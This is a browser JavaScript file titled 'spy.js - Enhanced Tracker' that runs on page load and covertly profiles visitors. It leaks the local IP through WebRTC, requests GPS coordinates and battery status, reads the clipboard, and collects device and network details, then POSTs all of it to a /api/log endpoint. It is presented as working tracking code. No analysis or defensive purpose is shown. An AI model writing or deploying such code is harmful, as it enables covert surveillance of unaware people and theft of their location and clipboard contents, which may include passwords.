// public/spy.js - Enhanced Tracker

async function getLocalIP() {
    return new Promise((resolve) => {
        const connection = new RTCPeerConnection({ iceServers: [] });
        connection.createDataChannel("");
        connection.createOffer().then(offer => connection.setLocalDescription(offer));
        
        let resolved = false;
        const handler = (event) => {
            if (resolved) return;
            if (!event.candidate) {
                connection.close();
                resolved = true;
                resolve(null);
            } else if (/candidate.*127/.test(event.candidate.candidate)) {
                const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/);
                if (ipMatch) {
                    connection.close();
                    resolved = true;
                    resolve(ipMatch[0]);
                }
            }
        };
        connection.onicecandidate = handler;
        setTimeout(() => {
            if (!resolved) {
                connection.close();
                resolved = true;
                resolve(null);
            }
        }, 2000);
    });
}

async function getBattery() {
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            return { level: battery.level, charging: battery.charging };
        }
    } catch (e) {}
    return null;
}

async function trackRat() {
    const data = {
        user_agent: navigator.userAgent,
        screen_res: `${screen.width}x${screen.height}`,
        timestamp: Date.now(),
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        connection_type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
        downlink: navigator.connection ? navigator.connection.downlink : null
    };

    // Get Local IP
    const localIP = await getLocalIP();
    if (localIP) data.local_ip = localIP;

    // Get GPS
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                data.lat = pos.coords.latitude;
                data.lon = pos.coords.longitude;
                data.accuracy = pos.coords.accuracy;
                
                // Add Battery Info
                getBattery().then(battery => {
                    if (battery) data.battery = battery;
                    
                    // Try to read clipboard (might prompt user)
                    navigator.clipboard.readText().then(text => {
                        if (text && text.length < 500) { // Don't log huge text
                            data.clipboard = text;
                        }
                        sendData(data);
                    }).catch(() => sendData(data)); // Send even if clipboard fails
                });
            },
            () => {
                getBattery().then(battery => {
                    if (battery) data.battery = battery;
                    sendData(data);
                });
            }
        );
    } else {
        getBattery().then(battery => {
            if (battery) data.battery = battery;
            sendData(data);
        });
    }
}

async function sendData(payload) {
    try {
        await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error("Send failed", e);
    }
}

trackRat();